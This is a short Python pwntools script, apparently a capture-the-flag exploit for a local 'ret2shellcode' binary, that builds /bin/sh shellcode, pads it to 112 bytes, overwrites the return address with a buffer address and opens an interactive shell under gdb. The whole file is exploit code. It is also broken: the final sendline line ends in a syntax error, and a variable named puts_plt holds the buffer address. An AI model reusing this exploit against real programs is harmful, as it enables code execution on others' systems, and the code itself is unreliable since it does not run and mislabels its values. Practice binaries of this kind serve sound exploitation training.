from pwn import *

context.arch = "i386"

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

gdb.attach(sh, "b *0x80485C5\nc\n")
pause()
puts_plt = 0x804a080
sh.sendline(shellcode.ljust(112, b'A') + p32(puts_plt) + )
sh.interactive()